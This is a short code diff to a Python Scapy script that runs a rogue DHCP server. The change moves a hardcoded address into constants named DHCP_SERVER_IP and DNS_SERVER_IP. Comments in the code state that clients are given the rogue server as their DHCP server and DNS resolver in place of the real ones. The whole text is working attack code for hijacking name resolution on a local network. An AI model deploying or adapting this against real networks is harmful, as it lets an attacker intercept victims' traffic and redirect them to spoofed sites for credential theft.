@@ -1,6 +1,10 @@
 from scapy.all import *
 from scapy.base_classes import Net
 
+
+DHCP_SERVER_IP = "10.0.0.33"
+DNS_SERVER_IP = "10.0.0.33"
+
 #Changing dhcp options by updating DHCP_am class from scapy module
 class DHCP_am(DHCP_am):
     function_name = "dhcpd"
@@ -11,9 +15,9 @@ class DHCP_am(DHCP_am):
             dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                             for op in req[DHCP].options
                             if isinstance(op, tuple) and op[0] == "message-type"]  # noqa: E501
-            dhcp_options += [("server_id", "10.0.0.33"), #updated server_id to the rogue dhcp server ip instead of the gateway
+            dhcp_options += [("server_id", DHCP_SERVER_IP), #updated server_id to the rogue dhcp server ip instead of the gateway
                              ("router", self.gw),
-                             ("name_server", "10.0.0.33"), #updated name_server to the rogue dns server ip instead of an actual dns server
+                             ("name_server", DNS_SERVER_IP), #updated name_server to the rogue dns server ip instead of an actual dns server
                              ("broadcast_address", self.broadcast),
                              ("subnet_mask", self.netmask),
                              ("renewal_time", self.renewal_time),
